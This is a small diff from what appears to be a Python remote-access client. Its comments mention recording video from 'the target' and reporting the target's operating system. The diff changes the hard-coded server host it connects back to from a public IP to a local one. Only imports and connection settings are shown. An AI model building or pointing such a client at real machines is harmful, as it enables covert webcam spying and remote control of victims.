@@ -5,7 +5,7 @@ import cv2 # For recording the video.
 import threading # For recording the video in a different thread.
 import platform # We use this to get the os of the target (client).
 
-SERVER_HOST = "90.143.203.101"
+SERVER_HOST = "192.168.0.8"
 SERVER_PORT = 4000
 BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, you can adjust this.
 # Separator string for sending 2 messages at a time.
